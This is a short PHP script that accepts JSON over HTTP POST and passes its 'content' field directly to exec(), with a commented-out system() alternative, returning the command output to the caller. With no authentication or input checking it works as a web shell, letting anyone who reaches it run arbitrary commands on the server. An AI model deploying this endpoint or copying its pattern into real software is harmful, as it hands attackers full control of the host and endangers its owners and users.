<?php
function return_response($status, $statusMessage, $data) {
    header("HTTP/1.1 $status $statusMessage");
    header("Content-Type: application/json; charset=UTF-8");
    echo json_encode($data);
}

$bodyRequest = file_get_contents("php://input");
$method = $_SERVER['REQUEST_METHOD'];

switch ($method) {
    case 'POST':
        handlePOST($bodyRequest);
        break;
    default:
        echo json_encode(['message' => 'Invalid request method']);
        break;
}

function handlePOST($bodyRequest) {
    $json = json_decode($bodyRequest);
    $command=$json->content;
    exec($command, $output);
    //system($command, $output);
    return_response(200, "OK", $output);
}
